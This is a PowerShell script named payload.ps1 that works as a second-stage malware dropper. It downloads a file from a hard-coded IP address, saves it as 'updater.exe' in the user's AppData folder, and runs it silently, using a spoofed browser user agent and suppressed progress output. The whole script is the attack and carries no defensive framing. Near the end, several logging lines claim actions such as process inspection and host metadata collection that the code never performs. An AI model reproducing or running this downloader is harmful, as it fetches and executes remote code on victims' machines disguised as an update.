
<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://192.0.2.163:8080/assets/update.dat",
    [string]$LocalPath = "$env:APPDATA\updater.exe",
    [string]$TracePath = "$env:TEMP\telemetry.json",
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    [int]$TimeoutSec = 239,
    [int]$RetryCount = 2,
    [int]$RetryDelaySeconds = 13
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $TracePath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$RetryCount = 2,
        [int]$RetryDelay = 13,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $Stage1Url
    $FetchResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $LocalPath -RetryCount $RetryCount -RetryDelay $RetryDelaySeconds -UserAgent $UserAgent
    if ($FetchResult) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath $LocalPath -ErrorAction SilentlyContinue
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $Stage1Url
    Destination = $LocalPath
    RetryCount = $RetryCount
    TimeoutSec = $TimeoutSec
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Resolving configured target"
Write-Verbose "Reading configuration values"
Write-Verbose "Validating result"
Write-Verbose "Exporting operation report"
Write-Verbose "Stage handoff finished"
Write-Verbose "Operation completed"
Write-Verbose "Retry budget remaining"
Write-Verbose "Preparing working directory"
Write-Verbose "Inspecting process list"
Write-Verbose "Collecting host metadata"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Applying operation timeout"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Write-Output "stage 2 initialized"
Set-Location -Path $env:TEMP
